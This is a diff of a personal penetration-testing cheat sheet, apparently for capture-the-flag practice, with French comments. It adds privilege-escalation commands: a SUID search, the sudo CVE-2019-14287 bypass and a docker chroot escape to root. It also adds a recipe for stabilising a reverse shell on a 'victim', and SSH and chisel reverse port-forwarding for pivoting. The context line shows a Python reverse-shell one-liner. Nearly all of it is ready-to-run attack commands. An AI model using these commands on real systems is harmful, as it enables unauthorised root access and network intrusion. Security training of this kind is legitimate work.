@@ -76,6 +76,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 #chercher les bibaire avec le bit SUID
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -o -type  f 2>/dev/null
+find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
 
 #chercher les binaire qui peuvent être exécuter avec le groupe <groupe_name>
 find / -group admin -perm /g=x 2>/dev/null
@@ -92,10 +93,13 @@ awk -F'@' '{print $1}' fowsniff.txt > users.txt
 sed -n 's/.*://p' cracked.txt > pass.txt
 
 
-##################################### SUDO EXPLOIT ########################################
+##################################### EXPLOIT ########################################
 
 #sudo version 1.8.27 (CVE-2019-14287) ::: (ALL, !root) /bin/bash
 sudo -u#-1 /bin/bash
+
+#docker exploit
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 
 ##################################### UPLOAD FILE #########################################
@@ -109,3 +113,56 @@ nc -q 5 -lvnp 7777 < user.jpg
 
 #allow ports
 network.security.ports.banned.override
+
+
+##################################### CURL TRICKS #########################################
+
+#faire une requête en spécifiant le user-agent
+curl -A "<user-agent>" -L <ip_address>
+
+
+
+
+#################################### SHELL STABILISATION ###################################
+
+#using python pty
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
+#dans mon shell
+stty raw -echo;fg
+
+#dans le shell de la victime
+stty rows 29 columns 126
+export TERM=screen
+
+#################################### ENUMERATION TOOLS #################################
+
+-chisel
+-linpeas
+-pspy
+-netsat -ano
+
+#################################### PIVOTING AND PORT FORWARDING ######################
+
+#port forwarding using SSH
+
+-target side:
+    #create SSH key pair
+    ssh-keysign -f <username>
+    #copied the public key to the authorized_keys
+    cd ~/.ssh
+    echo "<public_key" > authorized_keys
+    chmod 600 <private key>
+
+
+-attacker side
+ssh -L <reverse_port>:127.0.0.1:<port> -i <private_key> <username>@<target_ip_address>
+
+#port forwarding using chisel
+
+-target side:
+./chisel client <attaquer_ip>:<exposed_port> R:<reverse_port>:127.0.0.1:<listen_port>
+
+-attacker side
+./chisel server --reverse --port <exposed_port>
